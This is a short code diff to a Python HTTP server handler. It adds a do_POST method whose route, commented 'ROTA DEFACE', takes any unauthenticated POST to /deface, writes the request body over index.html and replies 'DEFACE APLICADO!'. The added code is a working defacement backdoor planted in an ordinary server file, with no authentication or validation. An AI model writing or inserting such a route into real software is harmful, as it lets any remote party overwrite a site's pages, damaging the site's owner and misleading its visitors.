@@ -173,6 +173,31 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         else:
             super().do_GET()
 
+    def do_POST(self):
+        # ===== ROTA DEFACE =====
+        if self.path.startswith('/deface'):
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                if content_length > 0:
+                    post_data = self.rfile.read(content_length)
+                    with open("index.html", "wb") as f:
+                        f.write(post_data)
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b"DEFACE APLICADO!")
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b"Sem dados")
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(f"Erro: {e}".encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b"Not Found")
+
     def log_message(self, fmt, *args):
         msg = fmt % args
         if "Bad request" in msg or "favicon.ico" in msg:
